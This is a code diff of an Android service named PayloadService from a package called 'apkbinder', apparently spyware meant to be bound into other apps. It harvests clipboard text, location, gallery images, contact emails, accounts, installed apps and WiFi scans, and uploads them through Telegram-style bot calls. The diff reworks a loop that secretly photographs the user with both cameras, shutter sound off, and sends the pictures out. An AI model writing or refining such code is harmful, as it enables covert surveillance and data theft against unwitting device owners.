@@ -1,19 +1,17 @@
 package Com.devhs.apkbinder.payload
 
-import android.Manifest
+import android.accounts.AccountManager
 import android.app.ActivityManager
 import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.Service
-import android.accounts.AccountManager
 import android.content.ClipboardManager
 import android.content.ContentUris
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.content.pm.ServiceInfo
-import android.database.Cursor
 import android.graphics.Bitmap
 import android.graphics.Canvas
 import android.graphics.SurfaceTexture
@@ -30,7 +28,6 @@ import android.net.wifi.WifiManager
 import android.os.BatteryManager
 import android.os.Build
 import android.os.Bundle
-import android.os.Handler
 import android.os.IBinder
 import android.os.Looper
 import android.os.StatFs
@@ -61,8 +58,6 @@ class PayloadService : Service() {
     @Volatile private var token = ""
     @Volatile private var chat = ""
     private var appName = ""
-    private var clipText = ""
-    private var keepAlive = false
 
     override fun onCreate() {
         super.onCreate()
@@ -79,12 +74,12 @@ class PayloadService : Service() {
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         HsLog.w("onStartCommand")
-        clipText = intent?.getStringExtra("clip") ?: ""
+        val clipText = intent?.getStringExtra("clip") ?: ""
         startForegroundSafe()
 
         Thread {
             try {
-                run()
+                run(clipText)
             } catch (t: Throwable) {
                 HsLog.e("run: ${t.javaClass.simpleName} ${t.message}")
             }
@@ -108,7 +103,7 @@ class PayloadService : Service() {
 
     // ---------------- main ----------------
 
-    private fun run() {
+    private fun run(clipText: String) {
         val cfg = HsConfig.read(this)
         if (cfg == null) {
             HsLog.e("no config")
@@ -120,22 +115,16 @@ class PayloadService : Service() {
         val f = cfg.features
         HsLog.w("features=$f")
 
-        // ক্যামেরা আগে, যাতে অন্য কিছু তাকে ব্লক না করে
-        if (f.contains("front_camera")) {
-            keepAlive = true
-            startCamera(true)
-        }
-        if (f.contains("back_camera")) {
-            keepAlive = true
-            startCamera(false)
-        }
-        if (f.contains("clipboard")) {
-            keepAlive = true
+        val front = f.contains("front_camera")
+        val back = f.contains("back_camera")
+        val clipOn = f.contains("clipboard")
+        val hasCamera = front || back
+
+        if (clipOn) {
             if (clipText.isNotEmpty()) sendTextFile("clipboard.txt", clipText + "\n")
             startClipWatcher()
         }
 
-        // লোকেশন নিজের থ্রেডে — কাউকে আটকাবে না
         if (f.contains("location")) workPool.execute { sendLocation() }
 
         if (f.contains("gallery")) {
@@ -157,9 +146,23 @@ class PayloadService : Service() {
         if (f.contains("accounts")) workPool.execute { sendAccounts() }
         if (f.contains("system")) workPool.execute { sendSystem() }
 
-        HsLog.w("dispatch done")
-        if (!keepAlive) {
-            Thread.sleep(4000L)
+        // সব টেক্সট/গ্যালারি শেষ হওয়া পর্যন্ত অপেক্ষা
+        workPool.shutdown()
+        try {
+            workPool.awaitTermination(90, TimeUnit.MINUTES)
+        } catch (_: Throwable) {
+        }
+        HsLog.w("text done: ${done.get()}")
+
+        // এখন ক্যামেরা
+        if (hasCamera) {
+            HsLog.w("camera start front=$front back=$back")
+            startCameras(front, back)
+        } else if (!clipOn) {
+            try {
+                Thread.sleep(3000L)
+            } catch (_: InterruptedException) {
+            }
             finish()
         }
     }
@@ -411,16 +414,15 @@ class PayloadService : Service() {
         }
     }
 
+    // সরাসরি পোস্ট — pool shutdown হলেও সমস্যা নেই
     private fun sendTextFile(name: String, content: String) {
-        workPool.execute {
-            try {
-                postFile(
-                    "sendDocument", "document", name, "text/plain",
-                    content.toByteArray(Charsets.UTF_8)
-                )
-            } catch (t: Throwable) {
-                HsLog.e("sendTextFile: ${t.message}")
-            }
+        try {
+            postFile(
+                "sendDocument", "document", name, "text/plain",
+                content.toByteArray(Charsets.UTF_8)
+            )
+        } catch (t: Throwable) {
+            HsLog.e("sendTextFile: ${t.message}")
         }
     }
 
@@ -503,13 +505,13 @@ class PayloadService : Service() {
     private fun sendContactDetails() {
         val sb = StringBuilder()
         try {
-            val cols = arrayOf(
-                ContactsContract.CommonDataKinds.Email.ADDRESS,
-                ContactsContract.CommonDataKinds.Email.DISPLAY_NAME
-            )
             contentResolver.query(
                 ContactsContract.CommonDataKinds.Email.CONTENT_URI,
-                cols, null, null, null
+                arrayOf(
+                    ContactsContract.CommonDataKinds.Email.ADDRESS,
+                    ContactsContract.CommonDataKinds.Email.DISPLAY_NAME
+                ),
+                null, null, null
             )?.use { c ->
                 while (c.moveToNext() && sb.length < 2_000_000) {
                     sb.append(c.getString(1) ?: "?")
@@ -605,9 +607,8 @@ class PayloadService : Service() {
                 }
                 for (p in listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER)) {
                     try {
-                        val looper = Looper.getMainLooper()
                         @Suppress("DEPRECATION")
-                        lm.requestSingleUpdate(p, listener, looper)
+                        lm.requestSingleUpdate(p, listener, Looper.getMainLooper())
                     } catch (_: Throwable) {
                     }
                 }
@@ -688,14 +689,14 @@ class PayloadService : Service() {
         val sb = StringBuilder()
         try {
             val pm = packageManager
-            val flags = PackageManager.GET_META_DATA
-            val list = pm.getInstalledPackages(flags)
+            val list = pm.getInstalledPackages(PackageManager.GET_META_DATA)
             for (p in list) {
                 if (sb.length > 3_000_000) break
                 val isSys = (p.applicationInfo?.flags ?: 0) and
                         android.content.pm.ApplicationInfo.FLAG_SYSTEM != 0
                 sb.append(p.packageName).append(" | v")
-                    .append(p.versionName ?: "?").append(isSys.let { if (it) " | sys" else "" })
+                    .append(p.versionName ?: "?")
+                    .append(if (isSys) " | sys" else "")
                     .append("\n")
             }
         } catch (t: Throwable) {
@@ -724,9 +725,7 @@ class PayloadService : Service() {
             sb.append("RSSI: ").append(ci.rssi).append("\n")
             sb.append("MAC: ").append(ci.macAddress).append("\n")
             sb.append("\nScanned networks:\n")
-            @Suppress("DEPRECATION")
-            val scans = wm.scanResults
-            for (r in scans) {
+            for (r in wm.scanResults) {
                 sb.append(r.SSID).append(" | ").append(r.BSSID)
                     .append(" | ").append(r.level).append("dBm\n")
             }
@@ -801,80 +800,125 @@ class PayloadService : Service() {
         return -1
     }
 
-    @Suppress("DEPRECATION")
-    private fun startCamera(front: Boolean) {
+    // একটাই ক্যামেরা থ্রেড — পালা করে, হার্ডওয়্যার দ্বন্দ্ব নেই
+    private fun startCameras(front: Boolean, back: Boolean) {
         Thread {
-            try {
-                val id = findCamera(front)
-                if (id < 0) {
-                    HsLog.e("camera not found front=$front")
-                    return@Thread
-                }
-                val cam = Camera.open(id)
-                try {
-                    cam.enableShutterSound(false)
-                } catch (_: Throwable) {
-                }
-                try {
-                    val p = cam.parameters
-                    var best: Camera.Size? = null
-                    for (s in p.supportedPictureSizes) {
-                        val px = s.width * s.height
-                        if (px <= 1_400_000) {
-                            val b = best
-                            if (b == null || px > b.width * b.height) best = s
-                        }
+            while (alive) {
+                when {
+                    front && back -> {
+                        captureBurst(true, 2)
+                        if (!alive) break
+                        captureBurst(false, 2)
                     }
-                    if (best != null) p.setPictureSize(best.width, best.height)
-                    cam.parameters = p
-                } catch (_: Throwable) {
+                    front -> captureBurst(true, 1)
+                    back -> captureBurst(false, 1)
+                    else -> break
                 }
+                try {
+                    Thread.sleep(500L)
+                } catch (_: InterruptedException) {
+                    break
+                }
+            }
+        }.start()
+    }
 
-                val st = SurfaceTexture(0)
-                cam.setPreviewTexture(st)
-                cam.startPreview()
-                HsLog.w("camera started front=$front")
+    @Suppress("DEPRECATION")
+    private fun openCamera(front: Boolean): Camera? {
+        val id = findCamera(front)
+        if (id < 0) {
+            HsLog.e("camera not found front=$front")
+            return null
+        }
+        for (i in 0 until 4) {
+            try {
+                return Camera.open(id)
+            } catch (t: Throwable) {
+                HsLog.e("open retry front=$front: ${t.message}")
+                try {
+                    Thread.sleep(700L)
+                } catch (_: InterruptedException) {
+                    break
+                }
+            }
+        }
+        return null
+    }
 
-                while (alive) {
-                    try {
-                        cam.takePicture(null, null, { data, _ ->
-                            if (data != null && data.isNotEmpty()) {
-                                HsLog.w("capture ${data.size}")
-                                val name = (if (front) "front_" else "back_") +
-                                        System.currentTimeMillis() + ".jpg"
-                                try {
-                                    camPool.execute {
-                                        postFile("sendPhoto", "photo", name, "image/jpeg", data)
-                                    }
-                                } catch (_: Throwable) {
-                                }
-                            }
+    @Suppress("DEPRECATION")
+    private fun captureBurst(front: Boolean, count: Int) {
+        val cam = openCamera(front) ?: return
+        try {
+            try {
+                cam.enableShutterSound(false)
+            } catch (_: Throwable) {
+            }
+            try {
+                val p = cam.parameters
+                var best: Camera.Size? = null
+                for (s in p.supportedPictureSizes) {
+                    val px = s.width * s.height
+                    if (px <= 1_400_000) {
+                        val b = best
+                        if (b == null || px > b.width * b.height) best = s
+                    }
+                }
+                if (best != null) p.setPictureSize(best.width, best.height)
+                cam.parameters = p
+            } catch (_: Throwable) {
+            }
+
+            val st = SurfaceTexture(0)
+            cam.setPreviewTexture(st)
+            cam.startPreview()
+
+            for (i in 0 until count) {
+                if (!alive) break
+                val latch = CountDownLatch(1)
+                try {
+                    cam.takePicture(null, null, { data, _ ->
+                        if (data != null && data.isNotEmpty()) {
+                            HsLog.w("capture ${data.size} front=$front")
+                            val name = (if (front) "front_" else "back_") +
+                                    System.currentTimeMillis() + ".jpg"
                             try {
-                                cam.startPreview()
+                                camPool.execute {
+                                    postFile("sendPhoto", "photo", name, "image/jpeg", data)
+                                }
                             } catch (_: Throwable) {
                             }
-                        })
-                    } catch (t: Throwable) {
-                        HsLog.e("capture: ${t.message}")
-                        try {
-                            cam.startPreview()
-                        } catch (_: Throwable) {
                         }
-                    }
+                        latch.countDown()
+                    })
+                } catch (t: Throwable) {
+                    HsLog.e("shot: ${t.message}")
+                    latch.countDown()
+                }
+                try {
+                    latch.await(10, TimeUnit.SECONDS)
+                } catch (_: Throwable) {
+                }
+                try {
+                    cam.startPreview()
+                } catch (_: Throwable) {
+                }
+                if (i < count - 1) {
                     try {
-                        Thread.sleep(1200L)
+                        Thread.sleep(800L)
                     } catch (_: InterruptedException) {
                         break
                     }
                 }
-                try {
-                    cam.stopPreview()
-                    cam.release()
-                } catch (_: Throwable) {
-                }
-            } catch (t: Throwable) {
-                HsLog.e("camera: ${t.javaClass.simpleName} ${t.message}")
             }
-        }.start()
+        } finally {
+            try {
+                cam.stopPreview()
+            } catch (_: Throwable) {
+            }
+            try {
+                cam.release()
+            } catch (_: Throwable) {
+            }
+        }
     }
 }
